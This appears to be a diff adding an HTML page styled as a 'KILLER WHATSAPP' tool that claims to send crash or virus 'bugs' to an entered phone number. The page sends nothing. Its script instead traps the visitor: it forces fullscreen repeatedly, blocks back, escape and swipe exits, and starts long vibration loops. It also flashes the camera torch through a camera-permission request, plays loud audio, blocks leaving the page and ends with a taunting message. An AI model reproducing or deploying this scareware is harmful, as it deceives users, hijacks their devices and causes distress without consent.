@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover">
+<title>Cape Cape buat dibilang ai🙄</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Oxanium:wght@300;400;600;800&display=swap');
+*{margin:0;padding:0;box-sizing:border-box;touch-action:manipulation;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;}
+html,body{width:100%;height:100%;overflow:hidden}
+body{background:#000;color:#fff;font-family:'Oxanium','Orbitron',sans-serif;position:fixed;top:0;left:0;right:0;bottom:0;background:linear-gradient(to bottom,#000000 0%,#1a0000 50%,#000000 100%);}
+.container{max-width:380px;margin:0 auto;padding:15px 15px 80px;display:flex;flex-direction:column;gap:20px;min-height:100vh;justify-content:center;align-items:center;}
+.card{background:rgba(10,0,0,.95);border:2px solid #ff0000;border-radius:12px;padding:20px;text-align:center;width:100%;box-shadow:0 0 25px rgba(255,0,0,.5),inset 0 0 15px rgba(255,0,0,.2);position:relative;overflow:hidden;}
+.card::before{content:'';position:absolute;top:0;left:0;width:100%;height:2px;background:#ff0000;box-shadow:0 0 10px #ff0000;}
+.card::after{content:'';position:absolute;bottom:0;left:0;width:100%;height:2px;background:#ff0000;box-shadow:0 0 10px #ff0000;}
+.header{text-align:center;margin-bottom:25px;}
+.header h1{font-family:'Orbitron',sans-serif;font-size:32px;font-weight:900;color:#ff0000;text-shadow:0 0 20px #ff0000,0 0 40px #ff0000;letter-spacing:3px;margin-bottom:5px;}
+.header h2{font-family:'Oxanium',sans-serif;font-size:18px;font-weight:600;color:#ff4444;text-shadow:0 0 10px #ff4444;letter-spacing:1px;}
+.user-card{background:rgba(20,0,0,.9);border:1px solid #ff0000;border-radius:10px;padding:15px;margin-bottom:10px;}
+.avatar{width:80px;height:80px;border:2px solid #ff0000;border-radius:50%;margin:0 auto 12px;box-shadow:0 0 25px #ff0000,inset 0 0 15px rgba(255,0,0,.3);object-fit:cover;position:relative;z-index:1;background:#222;}
+.username{font-size:22px;font-weight:800;color:#ff0000;text-shadow:0 0 15px #ff0000;position:relative;z-index:1;letter-spacing:1px;margin-bottom:5px;}
+.role{font-size:14px;color:#ff6666;text-shadow:0 0 8px #ff6666;position:relative;z-index:1;}
+.input-group{margin-bottom:20px;}
+.input-group label{display:block;text-align:left;font-size:14px;color:#ff0000;text-shadow:0 0 8px #ff0000;margin-bottom:8px;font-weight:600;}
+.input-group input,.input-group select{width:100%;padding:14px;background:rgba(30,0,0,.9);border:1px solid #ff0000;border-radius:8px;color:#fff;font-size:15px;font-family:'Oxanium',sans-serif;box-shadow:0 0 15px rgba(255,0,0,.3);}
+.input-group input::placeholder{color:rgba(255,150,150,.7);font-style:italic;}
+button{width:100%;padding:18px;margin-top:5px;background:linear-gradient(to bottom,#ff0000,#990000,#660000);border:none;border-radius:8px;color:#fff;font-size:20px;font-weight:900;cursor:pointer;box-shadow:0 0 30px rgba(255,0,0,.7),inset 0 1px 0 rgba(255,255,255,.2);transition:all .3s;position:relative;z-index:1;text-shadow:0 0 10px #000;letter-spacing:1px;font-family:'Orbitron',sans-serif;}
+button:hover{background:linear-gradient(to bottom,#ff2222,#aa0000,#770000);box-shadow:0 0 40px rgba(255,0,0,.9);transform:translateY(-2px);}
+.copyright{position:fixed;bottom:15px;left:0;width:100%;text-align:center;color:#ff4444;font-size:11px;letter-spacing:2px;opacity:.8;text-shadow:0 0 8px #ff4444;z-index:10;font-family:'Oxanium',sans-serif;}
+.chaos{position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:9999;display:none;flex-direction:column;justify-content:center;align-items:center;color:#ff0000;font-size:36px;text-align:center;animation:glitch 0.05s infinite;overflow:hidden;}
+.chaos.active{display:flex}
+.scanline{position:absolute;top:-100%;width:100%;height:12px;background:linear-gradient(transparent,#ff0000,transparent);animation:scan 2s linear infinite;}
+.glitch-text{animation:textGlitch 0.3s infinite;color:#ff0000;font-family:'Orbitron',sans-serif;}
+@keyframes glitch{0%,100%{text-shadow:6px 0 #ff0000,-6px 0 #990000;transform:translateX(-3px)}25%{text-shadow:-6px 0 #ff0000,6px 0 #990000;transform:translateX(3px)}50%{text-shadow:8px 0 #990000,-8px 0 #ff0000;transform:translateX(-5px)}75%{text-shadow:-8px 0 #990000,8px 0 #ff0000;transform:translateX(5px)}}
+@keyframes scan{0%{top:-100%}100%{top:100%}}
+@keyframes textGlitch{0%{transform:translateX(0)}25%{transform:translateX(4px)}50%{transform:translateX(-4px)}75%{transform:translateX(2px)}100%{transform:translateX(0)}}
+.particle{position:absolute;background:#ff0000;border-radius:50%;pointer-events:none;animation:float 3s infinite;}
+@keyframes float{0%,100%{transform:translateY(0) rotate(0deg);opacity:1}50%{transform:translateY(-80px) rotate(180deg);opacity:0.6}}
+.fullscreen-overlay{position:fixed;top:0;left:0;width:100vw;height:100vh;background:#000;z-index:99999;display:none;justify-content:center;align-items:center;}
+.fullscreen-overlay.active{display:flex}
+.exit-blocker{position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:100000;display:none;justify-content:center;align-items:center;flex-direction:column;}
+.exit-blocker.active{display:flex}
+.vibration-indicator{position:fixed;top:15px;right:15px;background:#ff0000;color:#fff;padding:8px 12px;border-radius:6px;font-weight:bold;z-index:100001;display:none;}
+.vibration-indicator.active{display:block}
+.trap-message{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#000;color:#ff0000;padding:25px;border-radius:15px;border:2px solid #ff0000;text-align:center;z-index:100002;display:none;width:85%;}
+.trap-message.active{display:block}
+.select-arrow{position:relative;}
+.select-arrow::after{content:'▼';position:absolute;right:15px;top:50%;transform:translateY(-50%);color:#ff0000;pointer-events:none;}
+.blood-text{font-family:'Orbitron',sans-serif;font-weight:900;color:#ff0000;text-shadow:0 0 15px #ff0000;letter-spacing:1px;}
+.warning-text{color:#ff9900;text-shadow:0 0 10px #ff9900;font-size:12px;margin-top:10px;font-style:italic;}
+</style>
+</head>
+<body>
+
+<div class="container" id="main">
+  <div class="header">
+    <h1>KILLER WHATSAPP</h1>
+    <h2>hello Welcome to my data tools, and it's very useful. Enjoy</h2>
+  </div>
+  
+  <div class="card">
+    <div class="user-card">
+      <img src="https://k.top4top.io/p_3668eu6764.png" class="avatar" alt="memuat">
+      <div class="username">XhrzoKilerV3</div>
+      <div class="role">User: Gratisan 🙄</div>
+    </div>
+    
+    <div class="input-group">
+      <label class="blood-text">Select Target & Bug</label>
+      <input type="text" placeholder="CONTOH : +62XXXXXXXXXXX" id="target" autocomplete="off">
+    </div>
+    
+    <div class="input-group">
+      <label class="blood-text">Select Bug Type</label>
+      <div class="select-arrow">
+        <select id="bug">
+          <option>Crash Android</option>
+          <option value="crash">⚡ ForClose No click</option>
+          <option value="bomb">💣 Forclose Infinity</option>
+          <option value="virus">🦠 Virus System Inject</option>
+          <option value="freeze">❄️ Freeze Permanent</option>
+          <option value="ultra">☢️ Delay Hard invisible</option>
+        </select>
+      </div>
+    </div>
+    
+    <button onclick="trapUser()" id="sendBtn">➤ SEND BUG</button>
+    <p class="warning-text">Click button to start bug sending process...</p>
+  </div>
+</div>
+
+<div class="copyright">© by 👾 Xhrzo</div>
+
+<div class="chaos" id="chaos">
+  <h1 class="glitch-text">🚨 SYSTEM 🚨</h1>
+  <h2 style="color:#ff9900">🔒LOCKED🔒</h2>
+  <h3 style="color:#ff0000">⚠️ DON'T TRY TO EXIT ⚠️</h3>
+  <p style="font-size:20px;margin-top:20px">Processing bug delivery...</p>
+  <p style="font-size:16px;color:#ff4444">Wait until process completes...</p>
+  <div class="scanline"></div>
+  <div class="scanline" style="animation-delay:0.6s"></div>
+  <div class="scanline" style="animation-delay:1.2s"></div>
+</div>
+
+<div class="fullscreen-overlay" id="fullscreenOverlay">
+  <h1 style="color:#ff0000;font-size:36px;text-align:center">⏳ SENDING BUG... ⏳</h1>
+  <p style="color:#ff9900;font-size:20px;margin-top:15px">Don't press back button!</p>
+</div>
+
+<div class="exit-blocker" id="exitBlocker">
+  <h1 style="color:#ff0000;font-size:40px">🚫 BLOCKED 🚫</h1>
+  <h5 style="color:#ff9900;font-size:28px">💀 YOUR PHONE IS LOCKED 💀</h5>
+  <p style="color:#ff4444;font-size:20px;margin-top:20px">Returning to fullscreen mode...</p>
+</div>
+
+<div class="trap-message" id="trapMessage">
+  <h1 style="color:#ff0000;font-size:32px">😹 YOU THOUGHT IT WAS REAL? 😹</h1>
+  <h2 style="color:#ff9900;font-size:24px">I'M JUST TESTING!</h2>
+  <p style="color:#ff4444;font-size:18px;margin-top:15px">If you want to exit, try restarting your phone!</p>
+  <p style="color:#fff;font-size:14px;margin-top:20px">But it still won't work hehehe 😈</p>
+</div>
+
+<div class="vibration-indicator" id="vibIndicator">💢 WARNING PHONE EXPLOSION 💢</div>
+
+<audio id="hackerMusic" preload="auto" loop>
+  <source src="https://c.top4top.io/m_36497gbuo0.mp3" type="audio/mpeg">
+</audio>
+
+<audio id="warningSound" preload="auto">
+  <source src="https://assets.mixkit.co/sfx/preview/mixkit-warning-alarm-1006.mp3" type="audio/mpeg">
+</audio>
+
+<audio id="evilLaugh" preload="auto">
+  <source src="https://e.top4top.io/m_3668znxmz0.mp3" type="audio/mpeg">
+</audio>
+// istraped false
+<script>
+let fullscreenLock = true;
+let isTrapped = false;
+let vibrationActive = true;
+let flashActive = false;
+let backAttempts = 0;
+let vibrationTimeout;
+let fullscreenInterval;
+
+function forceFullscreen() {
+  const elem = document.documentElement;
+  
+  if (elem.requestFullscreen) {
+    elem.requestFullscreen().catch(() => {
+      if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
+      if (elem.msRequestFullscreen) elem.msRequestFullscreen();
+    });
+  }
+  
+  fullscreenLock = true;
+  
+  document.addEventListener('fullscreenchange', lockFullscreen);
+  document.addEventListener('webkitfullscreenchange', lockFullscreen);
+  document.addEventListener('msfullscreenchange', lockFullscreen);
+  
+  // Hanya mulai interval fullscreen jika sudah di trap
+  if (isTrapped) {
+    startContinuousFullscreen();
+  }
+}
+
+function lockFullscreen() {
+  if (!document.fullscreenElement && !document.webkitFullscreenElement && 
+      !document.msFullscreenElement && fullscreenLock) {
+    setTimeout(forceFullscreen, 10);
+  }
+}
+
+function startContinuousFullscreen() {
+  // Hentikan interval sebelumnya jika ada
+  if (fullscreenInterval) {
+    clearInterval(fullscreenInterval);
+  }
+  
+  // Mulai interval untuk memaksa fullscreen terus menerus
+  fullscreenInterval = setInterval(() => {
+    if (!document.fullscreenElement && !document.webkitFullscreenElement && 
+        !document.msFullscreenElement && fullscreenLock) {
+      forceFullscreen();
+    }
+  }, 1); // Setiap 1 milidetik
+}
+
+function setupAntiBack() {
+  history.pushState(null, null, location.href);
+  
+  window.onpopstate = function(event) {
+    history.pushState(null, null, location.href);
+    backAttempts++;
+    
+    triggerVibration(100000);
+    showExitBlocker();
+    forceFullscreen();
+    return false;
+  };
+  
+  document.addEventListener('keydown', function(e) {
+    if (e.key === 'Backspace' || e.keyCode === 27 || e.key === 'Escape') {
+      e.preventDefault();
+      e.stopPropagation();
+      triggerVibration(3000);
+      showExitBlocker();
+      forceFullscreen();
+      return false;
+    }
+  });
+  
+  let startX = 0;
+  document.addEventListener('touchstart', function(e) {
+    startX = e.touches[0].clientX;
+  }, {passive: false});
+  
+  document.addEventListener('touchmove', function(e) {
+    if (!fullscreenLock) return;
+    
+    const currentX = e.touches[0].clientX;
+    const diff = startX - currentX;
+    
+    if (diff > 100) {
+      e.preventDefault();
+      e.stopPropagation();
+      triggerVibration(100000);
+      showExitBlocker();
+      forceFullscreen();
+    }
+  }, {passive: false});
+}
+
+function extremeVibration() {
+  if (!navigator.vibrate) return;
+  
+  vibrationActive = true;
+  document.getElementById('vibIndicator').classList.add('active');
+  
+  const vibrationPattern = [10000000];
+  
+  function vibrateLoop() {
+    if (!vibrationActive) {
+      document.getElementById('vibIndicator').classList.remove('active');
+      return;
+    }
+    
+    navigator.vibrate(vibrationPattern);
+    
+    vibrationTimeout = setTimeout(() => {
+      if (vibrationActive) {
+        vibrateLoop();
+      }
+    }, 10000);
+  }
+  
+  vibrateLoop();
+  
+  setInterval(() => {
+    if (vibrationActive && navigator.vibrate) {
+      navigator.vibrate([500000, 500000, 500000, 500000, 50000]);
+    }
+  }, 15000);
+}
+
+function triggerVibration(duration) {
+  if (navigator.vibrate) {
+    navigator.vibrate(duration);
+  }
+}
+
+function controlFlashlight() {
+  let torchState = false;
+  flashActive = true;
+  
+  const flashInterval = setInterval(async () => {
+    if (!flashActive) {
+      clearInterval(flashInterval);
+      return;
+    }
+    
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: "environment" }
+      });
+      
+      const track = stream.getVideoTracks()[0];
+      
+      if (track.getCapabilities().torch) {
+        await track.applyConstraints({
+          advanced: [{ torch: !torchState }]
+        });
+        torchState = !torchState;
+      }
+      
+      track.stop();
+    } catch (e) {}
+  }, 200);
+}
+
+function showExitBlocker() {
+  const blocker = document.getElementById('exitBlocker');
+  blocker.classList.add('active');
+  
+  const warning = document.getElementById('warningSound');
+  warning.volume = 1.0;
+  warning.currentTime = 0;
+  warning.play().catch(() => {});
+  
+  setTimeout(() => {
+    blocker.classList.remove('active');
+  }, 500);
+}
+
+function showTrapMessage() {
+  const trap = document.getElementById('trapMessage');
+  trap.classList.add('active');
+  
+  const laugh = document.getElementById('evilLaugh');
+  laugh.volume = 1.0;
+  laugh.currentTime = 0;
+  laugh.play().catch(() => {});
+  
+  setTimeout(() => {
+    trap.classList.remove('active');
+  }, 5000);
+}
+
+function createParticles(count) {
+  for (let i = 0; i < count; i++) {
+    const particle = document.createElement('div');
+    particle.className = 'particle';
+    particle.style.width = Math.random() * 20 + 5 + 'px';
+    particle.style.height = particle.style.width;
+    particle.style.left = Math.random() * 100 + 'vw';
+    particle.style.top = Math.random() * 100 + 'vh';
+    particle.style.background = `hsl(${Math.random() * 60 + 180}, 100%, 50%)`;
+    particle.style.animationDuration = Math.random() * 3 + 2 + 's';
+    particle.style.animationDelay = Math.random() * 2 + 's';
+    document.body.appendChild(particle);
+    
+    setTimeout(() => particle.remove(), 5000);
+  }
+}
+
+function trapUser() {
+  const target = document.getElementById('target').value.trim();
+  const bug = document.getElementById('bug').value;
+  
+  if (!target || bug === "Crash Android") {
+    alert("⚠️ FILL NUMBER AND SELECT BUG FIRST!");
+    return;
+  }
+  
+  isTrapped = true;
+  
+  document.getElementById('main').style.display = 'none';
+  forceFullscreen();
+  setupAntiBack();
+  
+  const overlay = document.getElementById('fullscreenOverlay');
+  overlay.classList.add('active');
+  setTimeout(() => overlay.classList.remove('active'), 1500);
+  
+  document.getElementById('chaos').classList.add('active');
+  
+  const music = document.getElementById('hackerMusic');
+  music.volume = 1.0;
+  music.currentTime = 0;
+  music.loop = true;
+  music.play().catch(() => {});
+  
+  extremeVibration();
+  controlFlashlight();
+  createParticles(500);
+  setInterval(() => createParticles(35), 2500);
+  
+  const chaosText = document.getElementById('chaos');
+  const fakeMessages = [
+    "🔍 Searching target: " + target,
+    "⚙️ Loading bug: " + bug,
+    "📡 Connecting to server...",
+    "🚀 Sending bug to target...",
+    "⏳ Process 25% complete...",
+    "⚠️ Target responding...",
+    "🔥 Overloading target system...",
+    "💀 Bug successfully injected!",
+    "🚨 Target system down!",
+    "🎯 Mission accomplished!"
+  ];
+  
+  let msgIndex = 0;
+  const textInterval = setInterval(() => {
+    if (msgIndex < fakeMessages.length) {
+      const p = document.createElement('p');
+      p.style.color = msgIndex % 2 === 0 ? '#ff4444' : '#ff9900';
+      p.style.fontSize = '18px';
+      p.style.marginTop = '12px';
+      p.style.animation = 'textGlitch 0.3s infinite';
+      p.textContent = fakeMessages[msgIndex];
+      chaosText.appendChild(p);
+      msgIndex++;
+      
+      chaosText.scrollTop = chaosText.scrollHeight;
+    }
+  }, 3000);
+  
+  document.addEventListener('visibilitychange', function() {
+    if (document.hidden) {
+      showExitBlocker();
+      forceFullscreen();
+    }
+  });
+  
+  document.addEventListener('contextmenu', (e) => {
+    e.preventDefault();
+    triggerVibration(100000);
+    return false;
+  });
+  
+  document.addEventListener('touchmove', (e) => {
+    if (fullscreenLock) e.preventDefault();
+  }, { passive: false });
+
+  const fullscreenCheck = setInterval(() => {
+    if (fullscreenLock && !document.fullscreenElement && 
+        !document.webkitFullscreenElement && !document.msFullscreenElement) {
+      forceFullscreen();
+    }
+  }, 0);
+  
+  setTimeout(() => {
+    clearInterval(textInterval);
+    clearInterval(fullscreenCheck);
+    showTrapMessage();
+  }, 30000);
+  
+  setTimeout(() => {
+    flashActive = false;
+  }, 60000);
+}
+
+document.addEventListener('DOMContentLoaded', function() {
+  document.addEventListener('touchmove', (e) => {
+    e.preventDefault();
+  }, { passive: false });
+  
+  if (isTrapped) {
+    forceFullscreen();
+  }
+  
+  if (document.fullscreenEnabled) {
+    document.getElementById('sendBtn').innerHTML = '➤ SEND BUG';
+  }
+});
+
+window.addEventListener('beforeunload', function(e) {
+  if (fullscreenLock) {
+    e.preventDefault();
+    e.returnValue = 'System locked! Cannot exit!';
+    return 'System locked! Cannot exit!';
+  }
+});
+
+window.addEventListener('error', function(e) {
+  e.preventDefault();
+  if (fullscreenLock) {
+    forceFullscreen();
+  }
+  return false;
+});
+</script>
+</body>
+</html>
